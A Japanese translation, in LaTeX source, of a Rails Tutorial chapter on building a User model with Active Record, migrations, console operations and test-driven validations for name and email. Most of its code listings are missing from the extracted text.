本書では、SQLiteを開発 (development) 環境で使い、またPostgreSQLを (Herokuでの) 本番環境で使います (\ref{sec:deploying})。Railsは、本番 (production) アプリケーションですら、データの保存方法の詳細についてほとんど考える必要がないくらいよくできています。
Gitでバージョン管理を行なっているのであれば、このタイミングでユーザーをモデリングするためのトピックブランチを作成しておいてください。
modeling-users
<n>\end{code}<n><n>    \subsection{データベースの移行} % (fold)<n>    \label{sec:database_migrations}<n><n>
\ref{sec:a_user_class}で扱ったカスタムビルドクラスの\kode{User}を思い出してください。このクラスは、\kode{name}と\kode{email}を属性に持つユーザーオブジェクトでした。
このクラスは役に立つ例として提供されましたが、Railsにとって極めて重要な部分である\emph{永続性}という要素が欠けていました。RailsコンソールでUserクラスのオブジェクトを作っても、コンソールからexitするとそのオブジェクトはすぐに消えてしまいました。
この節での目的は、簡単に消えることのないユーザーのモデルを構築することです。
メールアドレスをユーザー名にしたことで、ユーザー同士で通信できるように拡張できる可能性が開かれます (第\ref{cha:account_activation_and_password_reset})章)。
リスト\ref{code:example_user}では、以下のようにRubyの\kode{attr\_accessor}メソッドを使用しました。
それとは対照的に、Railsでユーザーをモデリングするときは、属性を明示的に識別する必要がありません。
上で簡潔に述べたように、Railsはデータを保存する際にデフォルトでリレーショナルデータベースを使用します。リレーショナルデータベースは、データ\emph{行}で構成される\emph{テーブル}からなり、各行はデータ属性の\emph{カラム} (列) を持ちます。
たとえば、nameとemailを持つユーザーを保存するのであれば、\kode{name}と\kode{email}のカラムを持つ\kode{users}テーブルを作成します (各行は1人のユーザーを表します)。
テーブルに格納されるデータの例を図\ref{fig:users_table}に、対応するデータモデルを図\ref{fig:user_model_sketch}に示します
(なお、図\ref{fig:user_model_sketch}は草案です。実際のデータモデルは図\ref{fig:user_model_initial}のようになります)。
\kode{name}や\kode{email}といったカラム名を今のうちに考えておくことで、後ほどUserオブジェクトの各属性をActiveRecordに伝えるときに楽になります。
\kode{users}テーブルに含まれるデータのサンプル
Userのデータモデルのスケッチ
リスト\ref{code:generate_users_controller}で、ユーザーコントローラ (と\kode{new}アクション) を作ったときに使った以下のコマンドを思い出してみてください。
モデルを作成するときは、上と似たようなパターンで\kode{generate model}というコマンドを使います。さらに、今回は\kode{name}や\kode{email}といった属性を付けたUserモデルを使いたいので、実際に打つコマンドはリスト\ref{code:generate_user_model}になります。
Userモデルを生成する
$ rails generate model User name:string email:string
      invoke  active_record
      create    app/models/user.rb
      create      test/models/user_test.rb
      create      test/fixtures/users.yml
(コントローラ名には複数形を使い、モデル名には単数形を用いるという慣習を頭に入れておいてください。コントローラは\emph{Users}でモデルは\emph{User}です)。
\kode{name:string}や\kode{email:string}オプションのパラメータを渡すことによって、データベースで使用したい2つの属性をRailsに伝えます。このときに、これらの属性の型情報も一緒に渡します (この場合は\kode{string})。
リスト\ref{code:generating_pages}やリスト\ref{code:generate_users_controller}でアクション名を使用して生成した例と比較してみてください。
リスト\ref{code:generate_user_model}にある\kode{generate}コマンドの結果のひとつとして、\emph{マイグレーション}と呼ばれる新しいファイルが生成されます。
マイグレーションは、データベースの構造をインクリメンタルに変更する手段を提供します。それにより、要求が変更された場合にデータモデルを適合させることができます。
このUserモデルの例の場合、マイグレーションはモデル生成スクリプトによって自動的に作られました。リスト\ref{code:users_migration}に示したように \kode{name}と\kode{email}の2つのカラムを持つ\kode{users}テーブルを作成します
(\ref{sec:uniqueness_validation}で、マイグレーションを一から手動で作成する方法について説明します。
(\kode{users}テーブルを作るための) Userモデルのマイグレーション
:name
マイグレーションファイル名の先頭には、それが生成された時間の\emph{タイムスタンプ}が追加されます。
以前はインクリメンタルな整数が追加されましたが、複数の開発者によるチームでは、複数のプログラマが同じ整数を持つマイグレーションを生成してしまい、コンフリクトを引き起こしていました。
現在のタイムスタンプによる方法であれば、まったく同時にマイグレーションが生成されるという通常ではありえないことが起きない限り、そのようなコンフリクトは避けられます。
マイグレーション自体は、データベースに与える変更を定義した\kode{change}メソッドの集まりです。
リスト\ref{code:users_migration}の場合、\kode{change}メソッドは\kode{create\_table}というRailsのメソッドを呼び、ユーザーを保存するためのテーブルをデータベースに作成します。
\kode{create\_table}メソッドはブロック変数を1つ持つブロック (\ref{sec:blocks}) を受け取ります。ここでは (“table”の頭文字を取って) \kode{t}です。
\kode{t}オブジェクトが具体的に何をしているのかを正確に知る必要はありませんので、どうか心配しないでください。\emph{抽象化レイヤ}の素晴らしい点は、それが何であるかを知る必要がないという点です。
安心して\kode{t}オブジェクトに仕事を任せればよいのです。
モデル名は単数形 (User) ですが、テーブル名は複数形 (\kode{users}) です。これはRailsで用いられる言葉の慣習を反映しています。モデルはひとりのユーザーを表すのに対し、データベースのテーブルは複数のユーザーから構成されます。
 (このマジックカラムの使用例を\ref{sec:creating_user_objects}から具体的に見ていきます)。
リスト\ref{code:users_migration}のマイグレーテョンによって作成された完全なデータモデルを図\ref{fig:user_model_initial}に示します
(図\ref{fig:user_model_sketch}のスケッチには無かったマジックカラムが追加されています)。
リスト\ref{code:users_migration}で生成されたUserのデータモデル
(\ref{sec:demo_users_resource}で、このコマンドを似たような状況で実行したことを思い出してみてください) 。
公式には「エスキューエライト (ess-cue-ell-ite)」と発音しますが、(本来は誤りとされている)「スィークゥエライト (sequel-ite)」もよく使われています。
(Cloud IDEを使っている場合は、図\ref{fig:sqlite_download}のようにまずはファイルをお手元にダウンロードする必要があります)。
図\ref{fig:sqlite_database_browser}の中に\kode{id}というマイグレーションのときに説明されなかったカラムの存在に気づいたかもしれません。
\ref{sec:demo_users_resource}で簡単に説明したとおり、このカラムは自動的に作成され、Railsが各行を一意に識別するために使用します。
\href{http://sqlitebrowser.org/}{DB Browser for SQLite}で作成した\kode{users}テーブルを確認する
Railsチュートリアルで使用されているものすべてを含め、ほとんどのマイグレーションが\emph{可逆}です。これは、\kode{db:rollback}というRakeタスクで変更を取り消せることを意味します。これを“マイグレーションの取り消し (migrate down) と呼びます。
$ bundle exec rake db:rollback
上のコマンドでは、データベースからusersテーブルを削除するために\kode{drop\_table}コマンドを内部で呼び出しています。
これがうまくいくのは、\kode{change}メソッドは\kode{drop\_table}が\kode{create\_table}の逆であることを知っているからです。つまり、ロールバック用の逆方向マイグレーションを簡単に導くことができるのです。
あるカラムを削除するような不可逆なマイグレーションの場合は、\kode{change}メソッドの代わりに、\kode{up}と\kode{down}のメソッドを別々に定義する必要があります。
詳細については、Railsガイドの「\href{http://guides.rubyonrails.org/migrations.html}{Active Record マイグレーション}」を参照してください。
もし今の時点でデータベースのロールバックを実行していた場合は、先に進む前にもう一度以下のようにマイグレーションを適用して元に戻してください。
これまで、リスト\ref{code:generate_user_model}のUserモデルの作成によってどのように (リスト\ref{code:generate_user_model}の) マイグレーションファイルが作成されるかを見てきました。そして図\ref{fig:sqlite_database_browser}でこのマイグレーションを実行した結果を見ました。\kode{users}テーブルを作成することで、\kode{development.sqlite3}という名のファイルを更新し、\kode{id}、\kode{name}、\kode{email}、\kode{created\_at}、\kode{updated\_at}を作成しました。
また、リスト\ref{code:generate_user_model}ではモデル用のuser.rbも作られました。
この節では、以後このモデル用ファイルを理解することに専念します。
これは控えめに言ってもとてもよくまとまっています (リスト\ref{code:raw_user_model})
生成されたばかりのUserモデル
第\ref{cha:rails_flavored_ruby}章と同じく、Railsコンソールを使用してデータモデルを調べてみましょう。
(この時点では) データベースを変更したくないので、コンソールを\emph{サンドボックス}モードで起動します。
$ rails console --sandbox
Loading development environment in sandbox
Any modifications you make will be rolled back on exit
"Any modifications you make will be rolled back on exit" (ここで行ったすべての変更は終了時にロールバックされます) というメッセージにわかりやすく示されているように、コンソールをサンドボックスで起動すると、そのセッションで行ったデータベースへの変更をコンソールの終了時にすべて “ロールバック” (取り消し) してくれます。
\ref{sec:a_user_class}のコンソールセッションでは\kode{User.new}で新しいユーザーオブジェクトを生成しましたが、リスト\ref{code:example_user}のexample\_userファイルを明示的にrequireするまでこのオブジェクトにはアクセスできませんでした。
しかし、モデルを使うと状況は異なります。\ref{sec:a_controller_class}で見たように、Railsコンソールは起動時にRailsの環境を自動的に読み込み、その環境にはモデルも含まれます。
つまり、新しいユーザーオブジェクトを作成するときに余分な作業を行わずに済むということです。
=> #<User id: nil, name: nil, email: nil, created_at: nil, updated_at: nil>
上の出力は、ユーザーオブジェクトをコンソール用に出力したものです。
\kode{User.new}を引数なしで呼んだ場合は、すべての属性が\kode{nil}のオブジェクトを返します。
\ref{sec:a_user_class}では、オブジェクトの属性を設定するための\emph{初期化ハッシュ (hash) }を引数に取るように、Userクラスの例 (user\_example.rb) を設計しました。この設計は、同様の方法でオブジェクトを初期化するActive Recordの設計に基づいています。
=> #<User id: nil, name: "Michael Hartl", email: "mhartl@example.com",
created_at: nil, updated_at: nil>
上のように、nameとemail属性が期待どおり設定されていることがわかります。
また、Active Recordを理解する上で、「\emph{有効性 (Validity)}」という概念も重要です。
\ref{sec:user_validations}で詳細について解説しますが、今はまず先ほどの\kode{user}オブジェクトが有効かどうか確認してみましょう。確認するためには\kode{valid?}メソッドを使います。
現時点ではまだデータベースにデータは格納されていません。つまり、\kode{User.new}は\emph{メモリ上で}オブジェクトを作成しただけで、\kode{user.valid?}という行はただオブジェクトが有効かどうかを確認しただけとなります (データベースにデータがあるかどうかは有効性には関係ありません)。
データベースにUserオブジェクトを保存するためには、\kode{user}オブジェクトから\kode{save}メソッドを呼び出す必要があります。
\kode{save}メソッドは、成功すれば\kode{true}を、失敗すれば\kode{false}を返します
(現状では、保存はすべて成功するはずです。失敗する場合については\ref{sec:user_validations}で説明します)。
この唯一の例外が\ref{sec:scopes_subselects_and_a_lambda}に記されています。
作成した時点でのユーザーオブジェクトは、\kode{id}属性、マジックカラムである\kode{created\_at}属性と\kode{updated\_at}属性の値がいずれも\kode{nil}であったことを思い出してください。
\kode{save}メソッドを実行した後に何が変更されたのかを確認してみましょう。
=> #<User id: 1, name: "Michael Hartl", email: "mhartl@example.com",
\kode{"2014-07-24 00:57:46"}というタイムスタンプが気になった方もいると思いますが、著者はこの箇所を真夜中過ぎに書いたわけではありません。実はこのタイムスタンプは\href{http://en.wikipedia.org/wiki/Coordinated_Universal_Time}{協定世界時 (UTC)} に合わせてあります。これは\href{http://en.wikipedia.org/wiki/Greenwich_Mean_Time}{グリニッジ標準時 (GMT)} と同様、標準時間として使用されます。
このときITUは、混乱を最小限にとどめるために、略称を1つだけにしたいと考えました。
このとき、英語式のCUTもフランス式のTUCも満場一致とならず、両者の妥協案としてUTCという略語が採用されました。
\ref{sec:a_user_class}のUserクラスと同様に、Userモデルのインスタンスはドット記法を用いてその属性にアクセスすることができます。
=> "Michael Hartl"
=> "mhartl@example.com"
詳細は第\ref{cha:sign_up}章でも説明しますが、上で見たようにモデルの生成と保存を2つのステップに分けておくと何かと便利です。しかし、Active Recordでは\kode{User.create}でモデルの生成と保存を同時におこなう方法も提供されています。
#<User id: 2, name: "A Nother", email: "another@example.org", created_at:
\kode{User.create}は、\kode{true}か\kode{false}を返す代わりに、ユーザーオブジェクト自身を返すことに注目してください。返されたユーザーオブジェクトは (上の2つ目のコマンドにある\kode{foo}のように) 変数に代入することもできます。
\kode{destroy}は\kode{create}の逆です。
\kode{create}と同じように、\kode{destroy}はそのオブジェクト自身を返しますが、その返り値を使用しても、もう一度\kode{destroy}を呼ぶことはできません。
さらに、削除されたオブジェクトは、以下のようにまだメモリ上に残っています。
では、オブジェクトが本当に削除されたかどうかをどのようにして知ればよいのでしょうか。
そして、保存して削除されていないオブジェクトの場合、どうやってデータベースからユーザーを取得するのでしょうか。
これらの問いに答えるためには、Active Recordを使ってUserオブジェクトを検索する方法について学ぶ必要があります。
Active Recordには、オブジェクトを検索するための方法がいくつもあります。
これらの機能を使用して、過去に作成した最初のユーザーを探してみましょう。また、3番目のユーザー (\kode{foo}) が削除されていることを確認しましょう。
まずは存在するユーザーから探してみましょう。
ここでは、\kode{User.find}にユーザーのidを渡しています。その結果、Active Recordはそのidのユーザーを返します。
次に、\kode{id}=\kode{3}のユーザーがまだデータベースに存在するかどうかを確認してみましょう。
ActiveRecord::RecordNotFound: Couldn't find User with ID=3
\ref{sec:creating_user_objects}で3番目のユーザーを削除したので、Active Recordはこのユーザーをデータベースの中から見つけることができませんでした。
例外と例外ハンドリングは、ある意味でRubyの高度なテーマです。本書では例外についてこれ以上言及しません。
しかし例外が重要なものであることも確かなので、\ref{sec:guide_to_further_resources}で推薦したRuby本で例外について詳しく学ぶことをおすすめします
一般的な\kode{find}メソッド以外に、Active Recordには特定の属性でユーザーを検索する方法もあります。
これまでメールアドレスをユーザー名として使用してきたので、このような\kode{find}関連メソッドは、ユーザーをサイトにログインさせる方法を学ぶときに役に立ちます (Chapter~\ref{cha:sign_up})。
ユーザー数が膨大になると\kode{find\_by}では検索効率が低下するのではないかと心配する方もいるかもしれませんが、あせる必要はありません。この問題およびデータベースのインデックスを使った解決策については\ref{sec:uniqueness_validation}で扱います。
ユーザーを検索する一般的な方法をあと少しだけご紹介して、この節を終わりにすることにしましょう。
まず初めに\kode{first}メソッドです。
読んで字のごとく、\kode{first}は単にデータベースの最初のユーザーを返します。
次は\kode{all}メソッドです。
#<User id: 2, name: "A Nother", email: "another@example.org", created_at:
いったんオブジェクトを作成すれば、今度は何度でも更新したくなるものです。
基本的な更新の方法は2つです。
ひとつは、\ref{sec:a_user_class}でやったように属性を個別に代入する方法です。
=> "mhartl@example.net"
変更をデータベースに保存するために最後にsaveを実行する必要があることを忘れないでください。
保存を行わずに\kode{reload}を実行すると、データベースの情報を元にオブジェクトを再読み込みするので、以下のように変更が取り消されます。
=> "foo@bar.com"
\kode{update\_attributes}メソッドは\kode{update}メソッドのエイリアスですが、単一属性を変更する\kode{update\_attribute}メソッドとの違いを明確にするために、筆者は長いメソッド名の方を好んで使っています。
=> "The Dude"
=> "dude@abides.org"
\kode{update\_attributes}メソッドは属性のハッシュを受け取り、成功時には更新と保存を続けて同時に行います (保存に成功した場合は\kode{true}を返します)。
ただし、検証に1つでも失敗すると、 \kode{update\_attributes}の呼び出しは失敗します。たとえば、\ref{sec:adding_a_secure_password}で実装する、パスワードをレコードに保存することを要求すると検証は失敗します。
特定の属性のみを更新したい場合は、以下のように\kode{update\_attribute}を使います。なお、update\_attributeには検証を回避するといった効果もあります。
ついに、\ref{sec:user_model}で作成したUserモデルに、アクセス可能な\kode{name}と\kode{email}属性が与えられました。しかし、これらの属性はどんな値でも取ることができてしまいます。現在は (空文字を含む) あらゆる文字列が有効です。
名前とメールアドレスには、もう少し何らかの制限があってよいはずです。
たとえば、\kode{name}は空であってはならず、\kode{email}はメールアドレスのフォーマットに従う必要があります。
さらに、メールアドレスをユーザーがログインするときの一意のユーザー名として使おうとしているので、メールアドレスがデータベース内で重複することのないようにする必要もあります。
要するに、\kode{name}と\kode{email}にあらゆる文字列を許すのは避けるべきです。これらの属性値には、何らかの制約を与える必要があります。
Active Record では\emph{検証 (Validation)} という機能を通して、こういった制約を課すことができるようになっています (実は\ref{sec:putting_the_micro_in_microposts}で少しだけ使っていました)。
ここでは、よく使われるケースのうちのいくつかについて説明します。それらは\emph{存在性 (presence)}の検証、\emph{長さ (length)}の検証、\emph{フォーマット (format)}の検証、\emph{一意性 (uniqueness)}の検証です。
\ref{sec:has_secure_password}では、よく使われる最終検証として\emph{確認 (confirmation)}を追加します。
\ref{sec:unsuccessful_signups}では、ユーザーが制約に違反したときに、検証機能によって自動的に表示される有用なエラーメッセージをお見せします。
<n><n>\subsection{有効性のテスト} % (fold)<n>\label{sec:a_validity_test}<n><n>As noted in Box~\ref{aside:when_to_test}, test-driven development isn't always the right tool for the job, but model validations are exactly the kind of features for which TDD is a perfect fit. 
バリデーション機能は強力ですが、うまく動いている自信を持つのが難しいです。しかし、(テスト駆動開発のように) まず失敗するテストを書き、次にテストを成功させるように実装すると、期待した通りに動いている自信を持てるようになります。
具体的なテスト方法についてですが、まず\emph{有効な}モデルのオブジェクトを作成し、その属性のうちの1つを有効でない属性に意図的に変更します。そして、バリデーションで失敗するかどうかをテストする、といった方針で進めていきます。
念のため、最初に作成時の状態に対してもテストを書いておき、最初のモデルが有効であるかどうかも確認しておきます。
このようにテストすることで、バリデーションのテストが失敗したとき、バリデーションの実装に問題があったのか、オブジェクトそのものに問題があったのかを確認することができます。
リスト\ref{code:generate_user_model}のコマンドを実行してUser用テストの原型ができているはずなので、まずはその中身から見ていきましょう (リスト\ref{code:default_user_test})。
デフォルトのUserテスト (モックのみ)
有効なオブジェクトに対してテストを書くために、\kode{setup}という特殊なメソッドを使って有効なUserオブジェクト (\kode{@user}) を作成します (このメソッドは第\ref{cha:static_pages}章の演習でも少し取り上げました)。setupメソッド内に書かれた処理は、各テストが走る直前に実行されます。\kode{@user}はインスタンス変数ですが、setupメソッド内で宣言しておけば、すべてのテスト内でこのインスタンス変数が使えるようになります。したがって、\kode{valid?}メソッドを使ってUserオブジェクトの有効性をテストすることができます (\ref{sec:creating_user_objects}).。
作成したコードをリスト\ref{code:valid_user_test}に示します
有効なUserかどうかをテストする
リスト\ref{code:valid_user_test}では、シンプルな\kode{assert}メソッドを使ってテストします。\kode{@user.valid?}が\kode{true}を返すと成功し、\kode{false}を返すと失敗します。
とはいえ、Userモデルにはまだバリデーションがないので、このテストは成功するはずです。
上では\kode{rake test:models}というコマンドを実行していますが、これはモデルに関するテストだけを走らせるコマンドです (\ref{sec:layout_link_tests}で使った\kode{rake test:integration}と似ていることに注目してください)。
おそらく最も基本的なバリデーションは「\emph{存在性 (Presence)}」です。これは単に、与えられた属性が存在することを検証します。
たとえばこの節では、ユーザーがデータベースに保存される前にnameとemailフィールドの両方が存在することを保証します。
\ref{sec:signup_error_messages}では、この要求を新しいユーザーを作るためのユーザー登録フォームにまで徹底させる方法を確認します。
まずはリスト\ref{code:valid_user_test}に、 \kode{name}属性の存在性に関するテストを追加します。
具体的にはリスト\ref{code:name_presence_test}のように、まず\kode{@user}変数の\kode{name}属性に対して空白の文字列をセットします。そして、\kode{assert\_not}メソッドを使って Userオブジェクトが有効でなくなったことを確認します。
\kode{name}属性にバリデーションに対するテスト 
第\ref{cha:a_toy_app}章の演習で少し触れましたが、name属性の存在を検査する方法は、リスト\ref{code:validates_presence_of_name}に示したとおり、\kode{validates} メソッドに\kode{presence: true}という引数を与えて使うことです。
\kode{presence: true}という引数は、要素がひとつの\emph{オプションハッシュ}です。\ref{sec:css_revisited}のようにメソッドの最後の引数としてハッシュを渡す場合、波括弧を付けなくても問題ありません
(\ref{sec:adding_to_the_layout}でも説明したように、Railsのオプションハッシュは繰り返し登場するテーマです)。
\kode{name}属性の存在性を検証する
リスト\ref{code:validates_presence_of_name}は一見魔法のように見えるかもしれませんが、\kode{validates}は単なるメソッドです。
括弧を使用してリスト\ref{code:validates_presence_of_name}を同等のコードに書き換えたものを以下に示します。
コンソールを起動して、Userモデルに検証を追加した効果を見てみましょう
今後、コンソールコマンドの出力は、特に教育的効果が高いと思える場合 (ここでの\kode{User.new}の場合など) を除いて省略いたします。
=> false
このように、\kode{user}変数が有効かどうかを\kode{valid?}メソッドでチェックすることができます。もしオブジェクトがひとつ以上の検証に失敗したときは、\kode{false}を返します。 また、すべてのバリデーションに通ったときに\kode{true}を返します。
今回の場合、検証が1つしかないので、どの検証が失敗したかわかります。しかし、失敗したときに作られる\kode{errors}オブジェクトを使って確認すれば、さらに便利です。
(Railsが属性の存在性を検査するときに、エラーメッセージはヒントになります。これには\kode{blank?}
メソッドを用います。\ref{sec:modifying_built_in_classes}の終わりに見ました)。
Userオブジェクトは有効ではなくなったので、データベースに保存しようとすると自動的に失敗するはずです。
この変更によりリスト\ref{code:name_presence_test}のテストは \passing しているはずです。
リスト\ref{code:name_presence_test}のモデルに倣って、\kode{email}属性の存在性についてもテストを書いてみましょう (リスト\ref{code:email_presence_test})。最初は失敗しますが、リスト\ref{code:validates_presence_of_email}のコードを追加することで成功するようになります。
\kode{email}属性の検証に対するテスト
\kode{email}属性の存在性を検証する
これですべての存在性がチェックされたので、テストスイートは \passing するはずです。
各ユーザーは、Userモデル上に名前を持つことを強制されるようになりました。しかし、これだけでは十分ではありません。ユーザーの名前はサンプルWebサイトに表示されるものなので、名前の長さにも制限を与える必要があります。
\ref{sec:presence_validation}で既に同じような作業を行ったので、この実装は簡単です。
最長のユーザー名の長さに科学的な根拠はありませんので、単に\kode{50}を上限として手頃な値を使うことにします。つまりここでは、\kode{51}文字の名前は長すぎることを検証します。
また、実際に問題になることはほとんどありませんが、問題になる可能性もあるので長すぎるメールアドレスに対してもバリデーションを掛けましょう。ほとんどのデータベースでは文字列の上限を255としているので、それに合わせて255文字を上限とします。
\ref{sec:format_validation}で説明するメールアドレスのフォーマットに関するバリデーションでは、こういった長さの検証はできないので、本節で長さに関するバリデーションを事前に追加しておきます。
結果をリスト\ref{code:length_validation_test}に示します。
\kode{name}の長さの検証に対するテスト 
リスト\ref{code:length_validation_test}では、51文字の文字列を簡単に作るために “文字列のかけ算” を使いました。
結果をコンソール上で確認できます。
=> "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
=> 51
メールアドレスの長さに対するバリデーションも、次のように長い文字列を作成して検証します。
=> "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<n>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
これをパスさせるためには、長さを強制するための検証の引数を使う必要があります。\kode{:maximum}パラメータと共に用いられる\kode{:length}は、長さの上限を強制します (リスト\ref{code:length_validation})。
 \kode{name}属性に長さの検証を追加する
これでテストが \passing になるはずです。
成功したテストスイートを流用して、今度は少し難しい、メールアドレスのフォーマット検証作業に取りかかりましょう。
\kode{name}属性の検証には、空文字でない、名前が51文字未満であるという最小限の制約しか与えていませんでした。\kode{email}属性の場合は、有効なメールアドレスかどうかを判定するために、もっと厳重な要求を満たさなければなりません。
これまでは空のメールアドレスのみを禁止してきましたが、ここではメールアドレスにおなじみのパターン\kode{user@example.com}に合っているかどうかも確認することを要求します。
なお、ここで使用するテストや検証は、形式がひとまず有効なメールアドレスを受け入れ、形式があからさまに無効なものを拒否するだけであり、すべての場合を網羅したものではないという点に注意してください。
最初に、有効なメールアドレスと無効なメールアドレスのコレクションに対するテストを行いましょう。
このコレクションを作るために、以下のコンソールセッションに示したような、文字列の配列を簡単に作れる\kode{\%w[]}という便利なテクニックを知っておくと良いでしょう。
=> ["foo", "bar", "baz"]
COM THE_US-ER@foo.bar.org first.last@foo.jp]
COM", "THE_US-ER@foo.bar.org", "first.last@foo.jp"]
THE_US-ER@foo.bar.org
first.last@foo.jp
\kode{each}メソッドを使って\kode{addresses}配列の各要素を繰り返し取り出しました (\ref{sec:blocks})。
このテクニックを学んだことで、基本となるメールアドレスフォーマット検証のテストを書く準備が整いました。
メールアドレスのバリデーションは扱いが難しく、エラーが発生しやすい部分なので、\emph{有効な}メールアドレスと無効なメールアドレスをいくつか用意して、バリデーション�内のエラーを検知していきます。
具体的には、\emph{user@example,com}のような無効なメールアドレスが弾かれることと、\emph{user@example.com}のような有効なメールアドレスが通ることを確認しながら、バリデーションを実装していきます
(ちなみに今の状態では、空でないメールアドレスであれば全て通ってしまいます) 。
まずは、有効なメールアドレスをリスト\ref{code:email_format_valid_tests}に示します。
有効なメールフォーマットをテストする
ここでは、assertメソッドの第2引数にエラーメッセージを追加していることに注目してください。これによって、どのメールアドレスでテストが失敗したのかを特定できるようになります。
(詳細な文字列を調べるために\ref{sec:hashes_and_symbols}で紹介した\kode{inspect}メソッドを使っています。)
どのメールアドレスで失敗したのかを知ることは非常に便利です。そこでリスト\ref{code:email_format_valid_tests}では、\kode{each}メソッドを使って各メールアドレスを順にテストしています。ループさせずにテストすると、失敗した行番号からとメールアドレスの行数を照らし合わせて、失敗したメールアドレスを特定するといった作業が発生してしまいます。
リスト\ref{code:email_format_valid_tests}と同様に、リスト\ref{code:email_format_validation_tests}でもエラーメッセージをカスタマイズして、どのメールアドレスで失敗したのかすぐに特定できるようにしておきます。 includes a custom error message to identify the exact address causing any failure.
メールフォーマットの検証に対するテスト ( \failing )
                     foo@bar_baz.com foo@bar+baz.com]
メールアドレスのフォーマットを検証するためには、次のように\kode{format}というオプションを使います。
このオプションは引数に\emph{正規表現 (Regular Expression)} (\emph{regex}とも呼ばれます) を取ります。正規表現は一見謎めいて見えますが、文字列のパターンマッチングにおいては非常に強力な言語です。
つまり、有効なメールアドレスだけにマッチして、無効なメールアドレスには\emph{マッチしない}正規表現を組み立てる必要があります。
(完全な正規表現)
驚いたことに公式標準によると、たとえば\kode{"Michael Hartl"example.com}のようなクォートとスペースを使用したメールアドレスも有効なのだそうです。
まったく馬鹿げています。
これが、その正規表現です。
この正規表現を理解するために、お手頃なサイズに分割して表\ref{table:valid_email_regex}にまとめました
表\ref{table:valid_email_regex}の正規表現の説明における「文字」は、実は「小文字のみ」が対象になっていることに注意してください。ただし、正規表現の末尾に\kode{i}オプションを追加してあるので、大文字小文字が区別されずにマッチするようになっています。
正規表現の開始を示す
文字列の先頭
英数字、アンダースコア (\_)、プラス (+)、ハイフン (-)、ドット (.) のいずれかを少なくとも1文字以上繰り返す
アットマーク
英小文字、数字、ハイフン、ドットのいずれかを少なくとも1文字以上繰り返す
ドット
英小文字を少なくとも1文字以上繰り返す
文字列の末尾
正規表現の終わりを示す
大文字小文字を無視するオプション
メールの正規表現を分解した結果
表\ref{table:valid_email_regex}からも多くのことを学べるとは思いますが、正規表現を本当に理解するためには実際に使って見るのが一番です。たとえば\href{http://www.rubular.com/}{Rubular}という対話的に正規表現を試せるWebサイトがあります (図\ref{fig:rubular})
もしRubularのサービスが便利だと思ったら、素晴らしい功績を残した開発者である\href{http://bit.ly/donate-to-rubular}{Michael Lovitt}さんに報いるために\href{http://lovitt.net/}{Rubularへの寄付}をお勧めします.。
このWebサイトはインタラクティブ性に富んだインターフェイスを持っていて、また、正規表現のクイックリファレンスも兼ね備えています。
Rubularをブラウザで開き、表\ref{table:valid_email_regex}の内容を実際に試してみることを強くお勧めします。正規表現は、読んで学ぶより対話的に学んだほうが早いです。
素晴らしい正規表現エディタ\href{http://www.rubular.com/}{Rubular}
表\ref{table:valid_email_regex}の正規表現を適用して\kode{email}のフォーマットを検証した結果を、リスト\ref{code:validates_format_of_email}に示します。
メールフォーマットを正規表現で検証する
正規表現\kode{VALID\_EMAIL\_REGEX}は\emph{定数}です。大文字で始まる名前はRubyでは定数を意味します。
このパターンに一致するメールアドレスだけが有効であることをチェックします
上の正規表現には少しだけ残念な点があります。\kode{foo@bar..com}のようなドットの連続を誤りとして検出できません。
この問題の修正するにはとてつもなく複雑な正規表現を使う必要がありますが、これは演習問題に回します (\ref{sec:modeling_users_exercises})。
残る制約は、メールアドレスが一意であることを強制するこだけとなりました。
メールアドレスの一意性を強制するために (ユーザー名として使うために)、\kode{validates}メソッドの\kode{:unique}オプションを使います。
ただしここで\emph{重大な}警告があります。以下の文面は流し読みせず、必ず注意深く読んでください。
まずは小さなテストから書いていきます。
モデルのテストではこれまで、主に\kode{User.new}を使ってきました。このメソッドは単にメモリ上にRubyのオブジェクトを作るだけです。しかし、一意性のテストのためには、メモリ上だけではなく、実際にレコードをデータベースに登録する必要があります
この節の冒頭で簡単に紹介したように、この目的に使用できる専用のテストデータベース\kode{db/test.sqlite3}があります。
そのため、まずは重複したメールアドレスからテストしていきます (リスト\ref{code:validates_uniqueness_of_email_test})。
重複するメールアドレス拒否のテスト 
上のコードでは、\kode{@user}と同じメールアドレスのユーザーは作成できないことを、\kode{@user.dup}を使ってテストしています。dupは、同じ属性を持つデータを複製するためのメソッドです。
\kode{@user}を保存した後では、複製されたユーザーのメールアドレスが既にデータベース内に存在するため、ユーザの作成は無効になるはずです。
リスト\ref{code:validates_uniqueness_of_email_test}のテストをパスさせるために、\kode{email}のバリデーションに\kode{uniqueness: true}というオプションを追加します リスト\ref{code:validates_uniqueness_of_email}。
メールアドレスの一意性を検証する ( \passing )
実装の途中ですが、ここでひとつ補足します。
技術的には、メールアドレスのうちドメイン名部分だけが (本当は) 大文字小文字を区別しません。\emph{foo@bar.com}は、本来は\emph{Foo@bar.com}とは別のアドレスです。
ただし現実的には、\href{http://email.about.com/od/emailbehindthescenes/f/email_case_sens.htm}{about.com}でも指摘されているように、メールアドレスの大文字小文字を区別することを前提にするのはまずい方法です。「メールアドレスの大文字小文字を区別すると、果てしない混乱と相互運用性の問題とひどい頭痛が発生する。メールアドレスの入力時に大文字小文字の区別を要求するのは賢い方法とは言えない。
現実には、メールアドレスの大文字小文字の区別を強制するメールサービスやISPはめったに存在しない。メールアドレスのすべての文字を大文字にするなど、受信者のメールアドレスが誤って入力されていれば、メールは返送されるだけだ。」
Riley Mosesによるご指摘に感謝いたします。
このため、大文字を区別しないでテストすることが肝要になり、実際のコードはリスト \ref{code:validates_uniqueness_of_email_case_insensitive_test}のようになります。
大文字小文字を区別しない、一意性のテスト ( \failing )
上のコードではStringの\kode{upcase}メソッドを使っています (\ref{sec:blocks})。
このテストは最初のメールアドレスの重複テストと同じことをしていますが、大文字に変換したメールアドレスを使っている点が異なります。
もしこのテストが少し抽象的すぎると感じるなら、Railsコンソールを起動して確認しましょう。
=> "USER@EXAMPLE.COM"
幸い、\kode{:uniqueness}では\kode{:case\_sensitive}という打ってつけのオプションが使用できます (リスト\ref{code:validates_uniqueness_of_email_case_insensitive}})。
メールアドレスの大文字小文字を無視した一意性の検証 ( \passing )
これはリスト\ref{code:validates_uniqueness_of_email_case_insensitive}で使用されていました。
Railsはこの場合、\kode{:uniqueness}を\kode{true}と判断します。
この時点で、アプリケーションは重要な警告と共にメールアドレスの一意性を強制し、テストスイートもパスするはずです。
